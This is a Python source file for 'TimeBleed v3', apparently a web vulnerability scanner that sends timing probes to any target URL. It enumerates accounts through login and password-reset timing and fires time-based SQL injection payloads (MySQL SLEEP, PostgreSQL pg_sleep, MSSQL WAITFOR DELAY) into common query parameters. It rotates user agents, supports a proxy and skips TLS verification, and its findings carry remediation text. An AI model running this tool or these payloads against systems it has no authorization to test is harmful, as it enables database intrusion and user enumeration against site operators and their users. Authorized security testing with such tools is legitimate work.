#!/usr/bin/env python3
"""TimeBleed v3 — fixes: confidence floor, proof requirement, proxy support."""
import asyncio, aiohttp, json, sys, time, statistics
from pathlib import Path
from urllib.parse import urlparse, quote

sys.path.insert(0, str(Path(__file__).parent))
from smart_filter import (
    build_baseline_404, delay, confidence_score, confidence_label,
    severity_from_confidence, meets_confidence_floor, random_ua, PROXY_URL, REQUEST_DELAY
)

TIMING_SAMPLES  = 5
MIN_DELTA_SECS  = 1.5
SLEEP_PAYLOAD_S = 3

class TimeBleed:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.findings = []
        self.baseline_404 = ""

    async def _timed_get(self, sess, url, headers=None):
        try:
            t0 = time.monotonic()
            async with sess.get(url, headers=headers or {}, ssl=False,
                                timeout=aiohttp.ClientTimeout(total=15),
                                allow_redirects=True) as r:
                body = await r.text(errors='ignore')
                return r.status, body, time.monotonic()-t0
        except asyncio.TimeoutError:
            return None, None, 15.0
        except Exception:
            return None, None, 0.0

    async def _timed_post(self, sess, url, json_data=None, headers=None):
        try:
            t0 = time.monotonic()
            async with sess.post(url, json=json_data or {}, headers=headers or {}, ssl=False,
                                 timeout=aiohttp.ClientTimeout(total=15)) as r:
                body = await r.text(errors='ignore')
                return r.status, body, time.monotonic()-t0
        except asyncio.TimeoutError:
            return None, None, 15.0
        except Exception:
            return None, None, 0.0

    async def _sample_times(self, sess, url, n=TIMING_SAMPLES, json_data=None):
        times = []
        for _ in range(n):
            _, _, t = await self._timed_post(sess, url, json_data=json_data) if json_data else await self._timed_get(sess, url)
            if t and 0 < t < 14: times.append(t)
            await asyncio.sleep(0.25)
        if not times: return 0.0, 0.0
        return statistics.mean(times), statistics.stdev(times) if len(times) > 1 else 0.0

    async def test_username_timing(self, sess):
        print("\n[*] Testing username enumeration via timing (statistical)...")
        for path in ['/api/auth/login','/api/login','/login','/api/v1/auth/login']:
            url = self.target + path
            mu_unk, sd_unk = await self._sample_times(sess, url, json_data={"email":"zzz_noexist@invalid.local","password":"x"})
            await delay()
            mu_adm, sd_adm = await self._sample_times(sess, url, json_data={"email":"admin@admin.com","password":"x"})
            await delay()
            if mu_unk < 0.05 or mu_adm < 0.05: continue
            delta = abs(mu_adm - mu_unk)
            threshold = max(0.3, 2.5*max(sd_unk, sd_adm, 0.01))
            if delta > threshold:
                conf = min(88, int(60 + (delta/threshold)*8))
                if meets_confidence_floor(conf):
                    self.findings.append({
                        'type':'USERNAME_TIMING_ORACLE','severity':severity_from_confidence('MEDIUM',conf),
                        'confidence':conf,'confidence_label':confidence_label(conf),'url':url,
                        'delta_ms':round(delta*1000),'known_mean_ms':round(mu_adm*1000),
                        'unknown_mean_ms':round(mu_unk*1000),
                        'proof':f"Mean response time delta: {delta*1000:.0f}ms (threshold: {threshold*1000:.0f}ms, {TIMING_SAMPLES} samples each)",
                        'detail':f"Username timing oracle at {path}: {delta*1000:.0f}ms difference",
                        'remediation':"Use constant-time string comparison. Add uniform delay to all login responses.",
                    })
                    print(f"  [MEDIUM] Username timing oracle: {delta*1000:.0f}ms delta at {url}")
                    return

    async def test_time_sqli(self, sess):
        print(f"\n[*] Testing time-based SQL injection (requesting {SLEEP_PAYLOAD_S}s delay)...")
        payloads = [
            (f"1' AND SLEEP({SLEEP_PAYLOAD_S})-- -","MySQL"),
            (f"1'; SELECT pg_sleep({SLEEP_PAYLOAD_S})-- -","PostgreSQL"),
            (f"1'; WAITFOR DELAY '0:0:{SLEEP_PAYLOAD_S}'--","MSSQL"),
        ]
        for endpoint in [self.target+p for p in ['/api/products','/api','/search','/api/v1']]:
            for param in ['id','q','search','product_id']:
                base_url = f"{endpoint}?{param}=1"
                mu_base, _ = await self._sample_times(sess, base_url, n=3)
                await delay()
                if mu_base < 0.01: continue
                for payload, db_type in payloads:
                    url = f"{endpoint}?{param}={quote(payload)}"
                    _, _, elapsed = await self._timed_get(sess, url)
                    await delay()
                    if elapsed and elapsed > mu_base + (SLEEP_PAYLOAD_S - 0.7):
                        conf = confidence_score({
                            'delay_observed':(elapsed > mu_base + SLEEP_PAYLOAD_S*0.7, 70),
                            'large_delta':(elapsed > mu_base + SLEEP_PAYLOAD_S*0.9, 30),
                        })
                        if meets_confidence_floor(conf):
                            self.findings.append({
                                'type':'TIME_BASED_SQLI','severity':severity_from_confidence('CRITICAL',conf),
                                'confidence':conf,'confidence_label':confidence_label(conf),
                                'url':url,'param':param,'payload':payload,'db_type':db_type,
                                'baseline_ms':round(mu_base*1000),'response_ms':round(elapsed*1000),
                                'delta_ms':round((elapsed-mu_base)*1000),
                                'proof':f"Response delayed {elapsed*1000:.0f}ms vs baseline {mu_base*1000:.0f}ms (expected ~{SLEEP_PAYLOAD_S*1000}ms delay)",
                                'detail':f"Time-based SQLi ({db_type}) via param '{param}'",
                                'remediation':"Use parameterised queries. Never interpolate user input into SQL.",
                            })
                            print(f"  [CRITICAL] Time SQLi ({db_type}) at {url}: {elapsed*1000:.0f}ms vs {mu_base*1000:.0f}ms")
                            return

    async def test_reset_timing(self, sess):
        print("\n[*] Testing password reset timing oracle...")
        for path in ['/api/auth/forgot-password','/forgot-password','/api/reset-password']:
            url = self.target + path
            mu_unk, sd_unk = await self._sample_times(sess, url, n=3, json_data={"email":"zzz_noexist@invalid.local"})
            await delay()
            mu_adm, sd_adm = await self._sample_times(sess, url, n=3, json_data={"email":"admin@example.com"})
            await delay()
            if mu_unk < 0.05 or mu_adm < 0.05: continue
            delta = abs(mu_adm - mu_unk)
            threshold = max(0.2, 2*max(sd_unk, sd_adm, 0.01))
            if delta > threshold and meets_confidence_floor(70):
                self.findings.append({
                    'type':'PASSWORD_RESET_TIMING','severity':'MEDIUM','confidence':70,
                    'confidence_label':'Medium','url':url,'delta_ms':round(delta*1000),
                    'proof':f"Reset timing delta {delta*1000:.0f}ms (threshold {threshold*1000:.0f}ms, {TIMING_SAMPLES} samples)",
                    'detail':f"Password reset timing oracle — user existence detectable at {path}",
                    'remediation':"Use constant-time email lookup. Always return the same delay regardless of email existence.",
                })
                print(f"  [MEDIUM] Reset timing oracle: {delta*1000:.0f}ms at {url}")
                return

    async def run(self):
        print("="*60)
        print("  TimeBleed v3 — Timing Side-Channel Analyser")
        print("="*60)
        conn = aiohttp.TCPConnector(limit=5, ssl=False)
        async with aiohttp.ClientSession(connector=conn,
                timeout=aiohttp.ClientTimeout(total=60),
                proxy=PROXY_URL or None,
                headers={"User-Agent": random_ua()}) as sess:
            print("[*] Building 404 baseline...")
            self.baseline_404 = await build_baseline_404(sess, self.target)
            await self.test_username_timing(sess)
            await self.test_time_sqli(sess)
            await self.test_reset_timing(sess)
        return self.findings

def get_target():
    p = Path("reports/_target.txt")
    if p.exists(): return p.read_text().strip()
    u = input("[?] Target URL: ").strip()
    return u if u.startswith("http") else "https://" + u

def main():
    target = get_target()
    Path("reports").mkdir(exist_ok=True)
    findings = asyncio.run(TimeBleed(target).run())
    with open("reports/timebleed.json",'w') as f: json.dump(findings,f,indent=2,default=str)
    print(f"\n[+] {len(findings)} findings -> reports/timebleed.json")

if __name__ == '__main__': main()
